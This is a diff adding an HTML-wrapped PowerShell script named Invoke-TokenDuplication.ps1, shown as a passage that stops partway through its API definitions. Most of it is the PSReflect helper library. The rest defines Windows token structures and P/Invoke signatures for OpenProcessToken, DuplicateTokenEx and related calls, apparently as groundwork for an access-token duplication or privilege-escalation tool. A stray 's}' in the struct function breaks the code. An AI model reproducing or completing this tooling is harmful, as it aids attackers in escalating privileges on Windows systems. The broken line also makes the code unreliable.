@@ -1,0 +1,1097 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Invoke-TokenDuplication.ps1</title>
+</head><body>function New-InMemoryModule<br/>
+{<br/>
+&lt;#<br/>
+.SYNOPSIS<br/>
+<br/>
+Creates an in-memory assembly and module<br/>
+<br/>
+Author: Matthew Graeber (@mattifestation)<br/>
+License: BSD 3-Clause<br/>
+Required Dependencies: None<br/>
+Optional Dependencies: None<br/>
+<br/>
+.DESCRIPTION<br/>
+<br/>
+When defining custom enums, structs, and unmanaged functions, it is<br/>
+necessary to associate to an assembly module. This helper function<br/>
+creates an in-memory module that can be passed to the 'enum',<br/>
+'struct', and Add-Win32Type functions.<br/>
+<br/>
+.PARAMETER ModuleName<br/>
+<br/>
+Specifies the desired name for the in-memory assembly and module. If<br/>
+ModuleName is not provided, it will default to a GUID.<br/>
+<br/>
+.EXAMPLE<br/>
+<br/>
+$Module = New-InMemoryModule -ModuleName Win32<br/>
+#&gt;<br/>
+<br/>
+  Param<br/>
+  (<br/>
+    [Parameter(Position = 0)]<br/>
+    [ValidateNotNullOrEmpty()]<br/>
+    [String]<br/>
+    $ModuleName = [Guid]::NewGuid().ToString()<br/>
+  )<br/>
+<br/>
+  $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())<br/>
+  $LoadedAssemblies = $AppDomain.GetAssemblies()<br/>
+<br/>
+  foreach ($Assembly in $LoadedAssemblies) {<br/>
+    if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {<br/>
+      return $Assembly<br/>
+    }<br/>
+  }<br/>
+<br/>
+  $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)<br/>
+  $Domain = $AppDomain<br/>
+  $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')<br/>
+  $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)<br/>
+<br/>
+  return $ModuleBuilder<br/>
+}<br/>
+<br/>
+function func<br/>
+{<br/>
+  Param<br/>
+  (<br/>
+    [Parameter(Position = 0, Mandatory = $True)]<br/>
+    [String]<br/>
+    $DllName,<br/>
+<br/>
+    [Parameter(Position = 1, Mandatory = $True)]<br/>
+    [string]<br/>
+    $FunctionName,<br/>
+<br/>
+    [Parameter(Position = 2, Mandatory = $True)]<br/>
+    [Type]<br/>
+    $ReturnType,<br/>
+<br/>
+    [Parameter(Position = 3)]<br/>
+    [Type[]]<br/>
+    $ParameterTypes,<br/>
+<br/>
+    [Parameter(Position = 4)]<br/>
+    [Runtime.InteropServices.CallingConvention]<br/>
+    $NativeCallingConvention,<br/>
+<br/>
+    [Parameter(Position = 5)]<br/>
+    [Runtime.InteropServices.CharSet]<br/>
+    $Charset,<br/>
+<br/>
+    [String]<br/>
+    $EntryPoint,<br/>
+<br/>
+    [Switch]<br/>
+    $SetLastError<br/>
+  )<br/>
+<br/>
+  $Properties = @{<br/>
+    DllName = $DllName<br/>
+    FunctionName = $FunctionName<br/>
+    ReturnType = $ReturnType<br/>
+  }<br/>
+<br/>
+  if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }<br/>
+  if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }<br/>
+  if ($Charset) { $Properties['Charset'] = $Charset }<br/>
+  if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }<br/>
+  if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }<br/>
+<br/>
+  New-Object PSObject -Property $Properties<br/>
+}<br/>
+<br/>
+function Add-Win32Type<br/>
+{<br/>
+&lt;#<br/>
+  .SYNOPSIS<br/>
+<br/>
+    Creates a .NET type for an unmanaged Win32 function.<br/>
+<br/>
+    Author: Matthew Graeber (@mattifestation)<br/>
+    License: BSD 3-Clause<br/>
+    Required Dependencies: None<br/>
+    Optional Dependencies: func<br/>
+<br/>
+  .DESCRIPTION<br/>
+<br/>
+    Add-Win32Type enables you to easily interact with unmanaged (i.e.<br/>
+    Win32 unmanaged) functions in PowerShell. After providing<br/>
+    Add-Win32Type with a function signature, a .NET type is created<br/>
+    using reflection (i.e. csc.exe is never called like with Add-Type).<br/>
+<br/>
+    The 'func' helper function can be used to reduce typing when defining<br/>
+    multiple function definitions.<br/>
+<br/>
+  .PARAMETER DllName<br/>
+<br/>
+    The name of the DLL.<br/>
+<br/>
+  .PARAMETER FunctionName<br/>
+<br/>
+    The name of the target function.<br/>
+<br/>
+  .PARAMETER ReturnType<br/>
+<br/>
+    The return type of the function.<br/>
+<br/>
+  .PARAMETER ParameterTypes<br/>
+<br/>
+    The function parameters.<br/>
+<br/>
+  .PARAMETER NativeCallingConvention<br/>
+<br/>
+    Specifies the native calling convention of the function. Defaults to<br/>
+    stdcall.<br/>
+<br/>
+  .PARAMETER Charset<br/>
+<br/>
+    If you need to explicitly call an 'A' or 'W' Win32 function, you can<br/>
+    specify the character set.<br/>
+<br/>
+  .PARAMETER SetLastError<br/>
+<br/>
+    Indicates whether the callee calls the SetLastError Win32 API<br/>
+    function before returning from the attributed method.<br/>
+<br/>
+  .PARAMETER Module<br/>
+<br/>
+    The in-memory module that will host the functions. Use<br/>
+    New-InMemoryModule to define an in-memory module.<br/>
+<br/>
+  .PARAMETER Namespace<br/>
+<br/>
+    An optional namespace to prepend to the type. Add-Win32Type defaults<br/>
+    to a namespace consisting only of the name of the DLL.<br/>
+<br/>
+  .EXAMPLE<br/>
+<br/>
+    $Mod = New-InMemoryModule -ModuleName Win32<br/>
+<br/>
+    $FunctionDefinitions = @(<br/>
+     (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),<br/>
+     (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),<br/>
+     (func ntdll RtlGetCurrentPeb ([IntPtr]) @())<br/>
+    )<br/>
+<br/>
+    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'<br/>
+    $Kernel32 = $Types['kernel32']<br/>
+    $Ntdll = $Types['ntdll']<br/>
+    $Ntdll::RtlGetCurrentPeb()<br/>
+    $ntdllbase = $Kernel32::GetModuleHandle('ntdll')<br/>
+    $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')<br/>
+<br/>
+  .NOTES<br/>
+<br/>
+    Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189<br/>
+<br/>
+    When defining multiple function prototypes, it is ideal to provide<br/>
+    Add-Win32Type with an array of function signatures. That way, they<br/>
+    are all incorporated into the same in-memory module.<br/>
+#&gt;<br/>
+<br/>
+  [OutputType([Hashtable])]<br/>
+  Param(<br/>
+    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]<br/>
+    [String]<br/>
+    $DllName,<br/>
+<br/>
+    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]<br/>
+    [String]<br/>
+    $FunctionName,<br/>
+<br/>
+    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]<br/>
+    [Type]<br/>
+    $ReturnType,<br/>
+<br/>
+    [Parameter(ValueFromPipelineByPropertyName = $True)]<br/>
+    [Type[]]<br/>
+    $ParameterTypes,<br/>
+<br/>
+    [Parameter(ValueFromPipelineByPropertyName = $True)]<br/>
+    [Runtime.InteropServices.CallingConvention]<br/>
+    $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,<br/>
+<br/>
+    [Parameter(ValueFromPipelineByPropertyName = $True)]<br/>
+    [Runtime.InteropServices.CharSet]<br/>
+    $Charset = [Runtime.InteropServices.CharSet]::Auto,<br/>
+<br/>
+    [Parameter(ValueFromPipelineByPropertyName = $True)]<br/>
+    [Switch]<br/>
+    $SetLastError,<br/>
+<br/>
+    [Parameter(Mandatory = $True)]<br/>
+    [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]<br/>
+    $Module,<br/>
+<br/>
+    [ValidateNotNull()]<br/>
+    [String]<br/>
+    $Namespace = ''<br/>
+  )<br/>
+<br/>
+  BEGIN<br/>
+  {<br/>
+    $TypeHash = @{}<br/>
+  }<br/>
+<br/>
+  PROCESS<br/>
+  {<br/>
+    if ($Module -is [Reflection.Assembly])<br/>
+    {<br/>
+      if ($Namespace)<br/>
+      {<br/>
+        $TypeHash[$DllName] = $Module.GetType(&quot;$Namespace.$DllName&quot;)<br/>
+      }<br/>
+      else<br/>
+      {<br/>
+        $TypeHash[$DllName] = $Module.GetType($DllName)<br/>
+      }<br/>
+    }<br/>
+    else<br/>
+    {<br/>
+      # Define one type for each DLL<br/>
+      if (!$TypeHash.ContainsKey($DllName))<br/>
+      {<br/>
+        if ($Namespace)<br/>
+        {<br/>
+          $TypeHash[$DllName] = $Module.DefineType(&quot;$Namespace.$DllName&quot;, 'Public,BeforeFieldInit')<br/>
+        }<br/>
+        else<br/>
+        {<br/>
+          $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')<br/>
+        }<br/>
+      }<br/>
+<br/>
+      $Method = $TypeHash[$DllName].DefineMethod(<br/>
+        $FunctionName,<br/>
+        'Public,Static,PinvokeImpl',<br/>
+        $ReturnType,<br/>
+        $ParameterTypes)<br/>
+<br/>
+      # Make each ByRef parameter an Out parameter<br/>
+      $i = 1<br/>
+      ForEach($Parameter in $ParameterTypes)<br/>
+      {<br/>
+        if ($Parameter.IsByRef)<br/>
+        {<br/>
+          [void] $Method.DefineParameter($i, 'Out', $Null)<br/>
+        }<br/>
+<br/>
+        $i++<br/>
+      }<br/>
+<br/>
+      $DllImport = [Runtime.InteropServices.DllImportAttribute]<br/>
+      $SetLastErrorField = $DllImport.GetField('SetLastError')<br/>
+      $CallingConventionField = $DllImport.GetField('CallingConvention')<br/>
+      $CharsetField = $DllImport.GetField('CharSet')<br/>
+      if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }<br/>
+<br/>
+      # Equivalent to C# version of [DllImport(DllName)]<br/>
+      $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])<br/>
+      $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,<br/>
+        $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),<br/>
+        [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),<br/>
+        [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))<br/>
+<br/>
+      $Method.SetCustomAttribute($DllImportAttribute)<br/>
+    }<br/>
+  }<br/>
+<br/>
+  END<br/>
+  {<br/>
+    if ($Module -is [Reflection.Assembly])<br/>
+    {<br/>
+      return $TypeHash<br/>
+    }<br/>
+<br/>
+    $ReturnTypes = @{}<br/>
+<br/>
+    ForEach ($Key in $TypeHash.Keys)<br/>
+    {<br/>
+      $Type = $TypeHash[$Key].CreateType()<br/>
+<br/>
+      $ReturnTypes[$Key] = $Type<br/>
+    }<br/>
+<br/>
+    return $ReturnTypes<br/>
+  }<br/>
+}<br/>
+<br/>
+function psenum<br/>
+{<br/>
+&lt;#<br/>
+  .SYNOPSIS<br/>
+<br/>
+    Creates an in-memory enumeration for use in your PowerShell session.<br/>
+<br/>
+    Author: Matthew Graeber (@mattifestation)<br/>
+    License: BSD 3-Clause<br/>
+    Required Dependencies: None<br/>
+    Optional Dependencies: None<br/>
+  <br/>
+  .DESCRIPTION<br/>
+<br/>
+    The 'psenum' function facilitates the creation of enums entirely in<br/>
+    memory using as close to a &quot;C style&quot; as PowerShell will allow.<br/>
+<br/>
+  .PARAMETER Module<br/>
+<br/>
+    The in-memory module that will host the enum. Use<br/>
+    New-InMemoryModule to define an in-memory module.<br/>
+<br/>
+  .PARAMETER FullName<br/>
+<br/>
+    The fully-qualified name of the enum.<br/>
+<br/>
+  .PARAMETER Type<br/>
+<br/>
+    The type of each enum element.<br/>
+<br/>
+  .PARAMETER EnumElements<br/>
+<br/>
+    A hashtable of enum elements.<br/>
+<br/>
+  .PARAMETER Bitfield<br/>
+<br/>
+    Specifies that the enum should be treated as a bitfield.<br/>
+<br/>
+  .EXAMPLE<br/>
+<br/>
+    $Mod = New-InMemoryModule -ModuleName Win32<br/>
+<br/>
+    $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{<br/>
+      UNKNOWN =         0<br/>
+      NATIVE =          1 # Image doesn't require a subsystem.<br/>
+      WINDOWS_GUI =       2 # Image runs in the Windows GUI subsystem.<br/>
+      WINDOWS_CUI =       3 # Image runs in the Windows character subsystem.<br/>
+      OS2_CUI =         5 # Image runs in the OS/2 character subsystem.<br/>
+      POSIX_CUI =        7 # Image runs in the Posix character subsystem.<br/>
+      NATIVE_WINDOWS =      8 # Image is a native Win9x driver.<br/>
+      WINDOWS_CE_GUI =      9 # Image runs in the Windows CE subsystem.<br/>
+      EFI_APPLICATION =     10<br/>
+      EFI_BOOT_SERVICE_DRIVER = 11<br/>
+      EFI_RUNTIME_DRIVER =    12<br/>
+      EFI_ROM =         13<br/>
+      XBOX =           14<br/>
+      WINDOWS_BOOT_APPLICATION = 16<br/>
+    }<br/>
+<br/>
+  .NOTES<br/>
+<br/>
+    PowerShell purists may disagree with the naming of this function but<br/>
+    again, this was developed in such a way so as to emulate a &quot;C style&quot;<br/>
+    definition as closely as possible. Sorry, I'm not going to name it<br/>
+    New-Enum. :P<br/>
+#&gt;<br/>
+<br/>
+  [OutputType([Type])]<br/>
+  Param<br/>
+  (<br/>
+    [Parameter(Position = 0, Mandatory = $True)]<br/>
+    [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]<br/>
+    $Module,<br/>
+<br/>
+    [Parameter(Position = 1, Mandatory = $True)]<br/>
+    [ValidateNotNullOrEmpty()]<br/>
+    [String]<br/>
+    $FullName,<br/>
+<br/>
+    [Parameter(Position = 2, Mandatory = $True)]<br/>
+    [Type]<br/>
+    $Type,<br/>
+<br/>
+    [Parameter(Position = 3, Mandatory = $True)]<br/>
+    [ValidateNotNullOrEmpty()]<br/>
+    [Hashtable]<br/>
+    $EnumElements,<br/>
+<br/>
+    [Switch]<br/>
+    $Bitfield<br/>
+  )<br/>
+<br/>
+  if ($Module -is [Reflection.Assembly])<br/>
+  {<br/>
+    return ($Module.GetType($FullName))<br/>
+  }<br/>
+<br/>
+  $EnumType = $Type -as [Type]<br/>
+<br/>
+  $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)<br/>
+<br/>
+  if ($Bitfield)<br/>
+  {<br/>
+    $FlagsConstructor = [FlagsAttribute].GetConstructor(@())<br/>
+    $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())<br/>
+    $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)<br/>
+  }<br/>
+<br/>
+  ForEach ($Key in $EnumElements.Keys)<br/>
+  {<br/>
+    # Apply the specified enum type to each element<br/>
+    $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)<br/>
+  }<br/>
+<br/>
+  $EnumBuilder.CreateType()<br/>
+}<br/>
+<br/>
+function field<br/>
+{<br/>
+  Param<br/>
+  (<br/>
+    [Parameter(Position = 0, Mandatory = $True)]<br/>
+    [UInt16]<br/>
+    $Position,<br/>
+    <br/>
+    [Parameter(Position = 1, Mandatory = $True)]<br/>
+    [Type]<br/>
+    $Type,<br/>
+    <br/>
+    [Parameter(Position = 2)]<br/>
+    [UInt16]<br/>
+    $Offset,<br/>
+    <br/>
+    [Object[]]<br/>
+    $MarshalAs<br/>
+  )<br/>
+<br/>
+  @{<br/>
+    Position = $Position<br/>
+    Type = $Type -as [Type]<br/>
+    Offset = $Offset<br/>
+    MarshalAs = $MarshalAs<br/>
+  }<br/>
+}<br/>
+<br/>
+function struct<br/>
+{<br/>
+&lt;#<br/>
+.SYNOPSIS<br/>
+<br/>
+Creates an in-memory struct for use in your PowerShell session.<br/>
+<br/>
+Author: Matthew Graeber (@mattifestation)<br/>
+License: BSD 3-Clause<br/>
+Required Dependencies: None<br/>
+Optional Dependencies: field<br/>
+<br/>
+.DESCRIPTION<br/>
+<br/>
+The 'struct' function facilitates the creation of structs entirely in<br/>
+memory using as close to a &quot;C style&quot; as PowerShell will allow. Struct<br/>
+fields are specified using a hashtable where each field of the struct<br/>
+is comprosed of the order in which it should be defined, its .NET<br/>
+type, and optionally, its offset and special marshaling attributes.<br/>
+<br/>
+One of the features of 'struct' is that after your struct is defined,<br/>
+it will come with a built-in GetSize method as well as an explicit<br/>
+converter so that you can easily cast an IntPtr to the struct without<br/>
+relying upon calling SizeOf and/or PtrToStructure in the Marshal<br/>
+class.<br/>
+<br/>
+.PARAMETER Module<br/>
+<br/>
+The in-memory module that will host the struct. Use<br/>
+New-InMemoryModule to define an in-memory module.<br/>
+<br/>
+.PARAMETER FullName<br/>
+<br/>
+The fully-qualified name of the struct.<br/>
+<br/>
+.PARAMETER StructFields<br/>
+<br/>
+A hashtable of fields. Use the 'field' helper function to ease<br/>
+defining each field.<br/>
+<br/>
+.PARAMETER PackingSize<br/>
+<br/>
+Specifies the memory alignment of fields.<br/>
+<br/>
+.PARAMETER ExplicitLayout<br/>
+<br/>
+Indicates that an explicit offset for each field will be specified.<br/>
+<br/>
+.PARAMETER CharSet<br/>
+<br/>
+Dictates which character set marshaled strings should use.<br/>
+<br/>
+.EXAMPLE<br/>
+<br/>
+$Mod = New-InMemoryModule -ModuleName Win32<br/>
+<br/>
+$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{<br/>
+  DOS_SIGNATURE =  0x5A4D<br/>
+  OS2_SIGNATURE =  0x454E<br/>
+  OS2_SIGNATURE_LE = 0x454C<br/>
+  VXD_SIGNATURE =  0x454C<br/>
+}<br/>
+<br/>
+$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{<br/>
+  e_magic =  field 0 $ImageDosSignature<br/>
+  e_cblp =   field 1 UInt16<br/>
+  e_cp =    field 2 UInt16<br/>
+  e_crlc =   field 3 UInt16<br/>
+  e_cparhdr = field 4 UInt16<br/>
+  e_minalloc = field 5 UInt16<br/>
+  e_maxalloc = field 6 UInt16<br/>
+  e_ss =    field 7 UInt16<br/>
+  e_sp =    field 8 UInt16<br/>
+  e_csum =   field 9 UInt16<br/>
+  e_ip =    field 10 UInt16<br/>
+  e_cs =    field 11 UInt16<br/>
+  e_lfarlc =  field 12 UInt16<br/>
+  e_ovno =   field 13 UInt16<br/>
+  e_res =   field 14 UInt16[] -MarshalAs @('ByValArray', 4)<br/>
+  e_oemid =  field 15 UInt16<br/>
+  e_oeminfo = field 16 UInt16<br/>
+  e_res2 =   field 17 UInt16[] -MarshalAs @('ByValArray', 10)<br/>
+  e_lfanew =  field 18 Int32<br/>
+}<br/>
+<br/>
+# Example of using an explicit layout in order to create a union.<br/>
+$TestUnion = struct $Mod TestUnion @{<br/>
+  field1 = field 0 UInt32 0<br/>
+  field2 = field 1 IntPtr 0<br/>
+} -ExplicitLayout<br/>
+<br/>
+.NOTES<br/>
+<br/>
+PowerShell purists may disagree with the naming of this function but<br/>
+again, this was developed in such a way so as to emulate a &quot;C style&quot;<br/>
+definition as closely as possible. Sorry, I'm not going to name it<br/>
+New-Struct. :P<br/>
+#&gt;<br/>
+<br/>
+  [OutputType([Type])]<br/>
+  Param<br/>
+  (<br/>
+    [Parameter(Position = 1, Mandatory = $True)]<br/>
+    [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]<br/>
+    $Module,<br/>
+<br/>
+    [Parameter(Position = 2, Mandatory = $True)]<br/>
+    [ValidateNotNullOrEmpty()]<br/>
+    [String]<br/>
+    $FullName,<br/>
+<br/>
+    [Parameter(Position = 3, Mandatory = $True)]<br/>
+    [ValidateNotNullOrEmpty()]<br/>
+    [Hashtable]<br/>
+    $StructFields,<br/>
+<br/>
+    [Reflection.Emit.PackingSize]<br/>
+    $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,<br/>
+<br/>
+    [Switch]<br/>
+    $ExplicitLayout,<br/>
+<br/>
+    [System.Runtime.InteropServices.CharSet]<br/>
+    $CharSet = [System.Runtime.InteropServices.CharSet]::Ansi<br/>
+  )<br/>
+<br/>
+  if ($Module -is [Reflection.Assembly])<br/>
+  {<br/>
+    return ($Module.GetType($FullName))<br/>
+  }<br/>
+<br/>
+  [Reflection.TypeAttributes] $StructAttributes = 'Class,<br/>
+    Public,<br/>
+    Sealed,<br/>
+    BeforeFieldInit'<br/>
+<br/>
+  if ($ExplicitLayout)<br/>
+  {<br/>
+    $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout<br/>
+  }<br/>
+  else<br/>
+  {<br/>
+    $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout<br/>
+  }<br/>
+<br/>
+  switch($CharSet)<br/>
+  {<br/>
+    Ansi<br/>
+    {<br/>
+      $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AnsiClass<br/>
+    }<br/>
+    Auto<br/>
+    {<br/>
+      $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AutoClass<br/>
+    }<br/>
+    Unicode<br/>
+    {<br/>
+      $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::UnicodeClass<br/>
+    s}<br/>
+  }<br/>
+<br/>
+  $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)<br/>
+  $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]<br/>
+  $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))<br/>
+<br/>
+  $Fields = New-Object Hashtable[]($StructFields.Count)<br/>
+<br/>
+  # Sort each field according to the orders specified<br/>
+  # Unfortunately, PSv2 doesn't have the luxury of the<br/>
+  # hashtable [Ordered] accelerator.<br/>
+  foreach ($Field in $StructFields.Keys)<br/>
+  {<br/>
+    $Index = $StructFields[$Field]['Position']<br/>
+    $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}<br/>
+  }<br/>
+<br/>
+  foreach ($Field in $Fields)<br/>
+  {<br/>
+    $FieldName = $Field['FieldName']<br/>
+    $FieldProp = $Field['Properties']<br/>
+<br/>
+    $Offset = $FieldProp['Offset']<br/>
+    $Type = $FieldProp['Type']<br/>
+    $MarshalAs = $FieldProp['MarshalAs']<br/>
+<br/>
+    $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')<br/>
+<br/>
+    if ($MarshalAs)<br/>
+    {<br/>
+      $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])<br/>
+      if ($MarshalAs[1])<br/>
+      {<br/>
+        $Size = $MarshalAs[1]<br/>
+        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,<br/>
+          $UnmanagedType, $SizeConst, @($Size))<br/>
+      }<br/>
+      else<br/>
+      {<br/>
+        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))<br/>
+      }<br/>
+      <br/>
+      $NewField.SetCustomAttribute($AttribBuilder)<br/>
+    }<br/>
+<br/>
+    if ($ExplicitLayout) { $NewField.SetOffset($Offset) }<br/>
+  }<br/>
+<br/>
+  # Make the struct aware of its own size.<br/>
+  # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!<br/>
+  $SizeMethod = $StructBuilder.DefineMethod('GetSize',<br/>
+    'Public, Static',<br/>
+    [Int],<br/>
+    [Type[]] @())<br/>
+  $ILGenerator = $SizeMethod.GetILGenerator()<br/>
+  # Thanks for the help, Jason Shirk!<br/>
+  $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)<br/>
+  $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,<br/>
+    [Type].GetMethod('GetTypeFromHandle'))<br/>
+  $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,<br/>
+    [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))<br/>
+  $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)<br/>
+<br/>
+  # Allow for explicit casting from an IntPtr<br/>
+  # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!<br/>
+  $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',<br/>
+    'PrivateScope, Public, Static, HideBySig, SpecialName',<br/>
+    $StructBuilder,<br/>
+    [Type[]] @([IntPtr]))<br/>
+  $ILGenerator2 = $ImplicitConverter.GetILGenerator()<br/>
+  $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)<br/>
+  $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)<br/>
+  $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)<br/>
+  $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,<br/>
+    [Type].GetMethod('GetTypeFromHandle'))<br/>
+  $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,<br/>
+    [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))<br/>
+  $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)<br/>
+  $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)<br/>
+<br/>
+  $StructBuilder.CreateType()<br/>
+}<br/>
+<br/>
+$Module = New-InMemoryModule -ModuleName Win32<br/>
+<br/>
+$SE_GROUP = psenum $Module SE_GROUP UInt32 @{<br/>
+  DISABLED      = 0x00000000<br/>
+  MANDATORY     = 0x00000001<br/>
+  ENABLED_BY_DEFAULT = 0x00000002<br/>
+  ENABLED      = 0x00000004<br/>
+  OWNER       = 0x00000008<br/>
+  USE_FOR_DENY_ONLY = 0x00000010<br/>
+  INTEGRITY     = 0x00000020<br/>
+  INTEGRITY_ENABLED = 0x00000040<br/>
+  RESOURCE      = 0x20000000<br/>
+  LOGON_ID      = 3221225472<br/>
+} -Bitfield<br/>
+<br/>
+<br/>
+$SECURITY_ATTRIBUTES = struct $Module SECURITY_ATTRIBUTES @{<br/>
+  nLength = field 0 Int<br/>
+  lpSecurityDescriptor = field 1 IntPtr<br/>
+  bInheritHandle = field 2 Int<br/>
+}<br/>
+<br/>
+$SID_IDENTIFIER_AUTHORITY = struct $Module SID_IDENTIFIER_AUTHORITY @{<br/>
+  value = field 0 byte[] -MarshalAs @('ByValArray',6)<br/>
+}<br/>
+<br/>
+$SID_AND_ATTRIBUTES = struct $Module SID_AND_ATTRIBUTES @{<br/>
+  Sid = field 0 IntPtr<br/>
+  Attributes = field 1 $SE_GROUP<br/>
+}<br/>
+<br/>
+<br/>
+$TOKEN_MANDATORY_LABEL = struct $Module TOKEN_MANDATORY_LABEL @{<br/>
+  Label = field 0 $SID_AND_ATTRIBUTES<br/>
+}<br/>
+<br/>
+$STARTUPINFO = struct $Module STARTUPINFO @{<br/>
+  cb = field 0 int<br/>
+  lpReserved = field 1 string<br/>
+  lpDesktop = field 2 string<br/>
+  lpTitle = field 3 string<br/>
+  dwX = field 4 int<br/>
+  dwY = field 5 int<br/>
+  dwXSize = field 6 int<br/>
+  dwYSize = field 7 int<br/>
+  dwXCountChars = field 8 int<br/>
+  dwYCountChars = field 9 int<br/>
+  dwFillAttribute = field 10 int<br/>
+  dwFlags = field 11 int<br/>
+  wShowWindow = field 12 int<br/>
+  cbReserved2 = field 13 int<br/>
+  lpReserved2 = field 14 IntPtr<br/>
+  hStdInput = field 15 IntPtr<br/>
+  hStdOutput = field 16 IntPtr<br/>
+  hStdError = field 17 IntPtr<br/>
+}<br/>
+<br/>
+$PROCESS_INFORMATION = struct $Module PROCESS_INFORMATION @{<br/>
+  hProcess = field 0 IntPtr<br/>
+  hThread = field 1 IntPtr<br/>
+  dwProcessId = field 2 int<br/>
+  dwThreadId = field 3 int<br/>
+}<br/>
+<br/>
+$FunctionDefinitions = @(<br/>
+  (func advapi32 OpenProcessToken ([bool]) @(<br/>
+    [IntPtr],<br/>
+    [UInt32],<br/>
+    [IntPtr].MakeByRefType()<br/>
+  ) -EntryPoint OpenProcessToken -SetLastError),<br/>
+<br/>
+  (func advapi32 GetTokenInformation ([bool]) @(<br/>
+    [IntPtr],<br/>
+    [Int32],<br/>
+    [IntPtr],<br/>
+    [UInt32],<br/>
+    [UInt32].MakeByRefType()<br/>
+  ) -EntryPoint GetTokenInformation -SetLastError),<br/>
+<br/>
+  (func advapi32 GetSidSubAuthorityCount ([IntPtr]) @(<br/>
+    [IntPtr]<br/>
+  ) -EntryPoint GetSidSubAuthorityCount -SetLastError),<br/>
+<br/>
+  (func advapi32 GetSidSubAuthority([IntPtr]) @(<br/>
+    [IntPtr],<br/>
+    [UInt32]<br/>
+  ) -EntryPoint GetSidSubAuthority -SetLastError),<br/>
+<br/>
+  (func advapi32 DuplicateTokenEx ([bool]) @(<br/>
+    [IntPtr],<br/>
+    [UInt32],<br/>
+    [IntPtr],<br/>
+    [UInt32],<br/>
+    [UInt32],<br/>
+    [IntPtr].MakeByRefType()<br/>
+  ) -EntryPoint DuplicateTokenEx -SetLastError),<br/>
+<br/>
+  (func advapi32 AllocateAndInitializeSid ([bool]) @(<br/>
+    $SID_IDENTIFIER_AUTHORITY,<br/>
+    [Byte],<br/>
